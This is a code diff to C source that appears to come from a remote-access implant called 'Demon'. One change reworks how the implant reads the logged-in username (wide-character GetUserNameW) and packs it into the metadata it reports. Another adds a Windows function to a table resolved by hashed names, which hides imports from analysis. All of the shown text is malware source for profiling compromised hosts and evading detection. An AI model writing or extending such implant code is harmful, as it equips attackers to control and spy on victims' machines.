@@ -184,16 +184,17 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
 
     // Get Username
     dwLength = 0;
-    if ( ! Instance->Win32.GetUserNameA( NULL, &dwLength ) )
+    if ( ! Instance->Win32.GetUserNameW( NULL, &dwLength ) )
     {
+        dwLength *= 2;
         if ( ( Data = Instance->Win32.LocalAlloc( LPTR, dwLength ) ) )
         {
             MemSet( Data, 0, dwLength );
-            if ( Instance->Win32.GetUserNameA( Data, &dwLength ) )
-                PackageAddBytes( *MetaData, Data, dwLength );
+            if ( Instance->Win32.GetUserNameW( Data, &dwLength ) )
+                PackageAddWString( *MetaData, Data );
             else
                 PackageAddInt32( *MetaData, 0 );
-            DATA_FREE( Data, dwLength );
+            DATA_FREE( Data, dwLength*2 );
         }
         else
             PackageAddInt32( *MetaData, 0 );
@@ -414,6 +415,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.ConvertFiberToThread            = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_CONVERTFIBERTOTHREAD );
         Instance->Win32.CreateFiberEx                   = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_CREATEFIBEREX );
         Instance->Win32.ReadFile                        = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_READFILE );
+        Instance->Win32.MultiByteToWideChar             = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_MULTIBYTETOWIDECHAR );
         Instance->Win32.VirtualAllocEx                  = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_VIRTUALALLOCEX );
         Instance->Win32.WaitForSingleObjectEx           = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_WAITFORSINGLEOBJECTEX );
         Instance->Win32.GetComputerNameExA              = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETCOMPUTERNAMEEXA );
